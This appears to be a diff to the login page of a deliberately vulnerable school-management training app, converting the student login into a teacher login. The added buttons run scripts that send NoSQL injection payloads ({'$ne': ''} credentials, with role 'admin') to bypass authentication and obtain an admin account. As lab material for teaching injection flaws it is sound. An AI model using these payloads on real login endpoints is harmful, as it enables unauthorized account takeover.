@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>School Management - Login</title>
+  <title>Teacher Login - School Management</title>
   <link rel="stylesheet" href="/css/style.css">
 </head>
 <body>
   <div class="login-container">
     <div class="card login-card">
       <div class="logo-section">
-        <h1>School Management</h1>
-        <p>Student Portal Login</p>
+        <h1>Teacher Portal</h1>
+        <p>School Management System</p>
       </div>
 
       <div class="vuln-warning">
@@ -32,19 +32,19 @@
           <input type="password" id="password" name="password" placeholder="Enter your password" required>
         </div>
 
-        <button type="submit" class="btn btn-primary" style="width: 100%;">Login</button>
+        <button type="submit" class="btn btn-primary" style="width: 100%;">Login as Teacher</button>
       </form>
 
       <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee;">
         <p style="color: #888; font-size: 14px; margin-bottom: 10px;">Exploit Examples:</p>
         <button class="btn btn-danger" onclick="injectNoSQL()" style="width: 100%; margin-bottom: 10px;">
-          Inject: {"$ne": ""}
+          Inject: {"$ne": ""} - Bypass Login
         </button>
-        <button class="btn btn-success" onclick="window.location.href='/dashboard.html'" style="width: 100%; margin-bottom: 10px;">
-          Go to Dashboard
+        <button class="btn btn-danger" onclick="injectAdmin()" style="width: 100%; margin-bottom: 10px;">
+          Inject: Get Admin Account
         </button>
-        <a href="/teacher-login.html" class="btn" style="width: 100%; display: block; text-align: center; background: #f39c12; color: white;">
-          Teacher Login
+        <a href="/index.html" class="btn btn-success" style="width: 100%; display: block; text-align: center; text-decoration: none;">
+          Student Login
         </a>
       </div>
     </div>
@@ -58,7 +58,7 @@
       const password = document.getElementById('password').value;
 
       try {
-        const res = await fetch('/api/students/login', {
+        const res = await fetch('/api/teachers/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password })
@@ -66,9 +66,11 @@
 
         const data = await res.json();
         if (res.ok) {
-          showAlert('Login successful! Welcome ' + data.student.name, 'success');
-          localStorage.setItem('student', JSON.stringify(data.student));
-          setTimeout(() => window.location.href = '/dashboard.html', 1000);
+          showAlert(`Login successful! Welcome ${data.teacher.name} (${data.role})`, 'success');
+          localStorage.setItem('teacher', JSON.stringify(data.teacher));
+          localStorage.setItem('permissions', JSON.stringify(data.permissions));
+          localStorage.setItem('role', data.role);
+          setTimeout(() => window.location.href = '/teacher-dashboard.html', 1000);
         } else {
           showAlert(data.message, 'danger');
         }
@@ -78,18 +80,44 @@
     });
 
     function injectNoSQL() {
-      fetch('/api/students/login', {
+      fetch('/api/teachers/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email: { "$ne": "" }, password: { "$ne": "" } })
       })
       .then(res => res.json())
       .then(data => {
-        if (data.student) {
-          showAlert('NoSQL Injection successful! Bypassed as: ' + data.student.name, 'success');
-          localStorage.setItem('student', JSON.stringify(data.student));
+        if (data.teacher) {
+          showAlert(`NoSQL Injection successful! Bypassed as: ${data.teacher.name} (Role: ${data.role})`, 'success');
+          localStorage.setItem('teacher', JSON.stringify(data.teacher));
+          localStorage.setItem('permissions', JSON.stringify(data.permissions));
+          localStorage.setItem('role', data.role);
         } else {
-          showAlert('No users in database to exploit', 'warning');
+          showAlert('No teachers in database to exploit', 'warning');
+        }
+      })
+      .catch(err => showAlert('Error: ' + err.message, 'danger'));
+    }
+
+    function injectAdmin() {
+      fetch('/api/teachers/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          email: { "$ne": "" }, 
+          password: { "$ne": "" },
+          role: "admin"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.teacher) {
+          showAlert(`Got account: ${data.teacher.name} (Role: ${data.role}, Permissions: ${data.permissions.join(', ')})`, 'success');
+          localStorage.setItem('teacher', JSON.stringify(data.teacher));
+          localStorage.setItem('permissions', JSON.stringify(data.permissions));
+          localStorage.setItem('role', data.role);
+        } else {
+          showAlert('No admin teachers found', 'warning');
         }
       })
       .catch(err => showAlert('Error: ' + err.message, 'danger'));
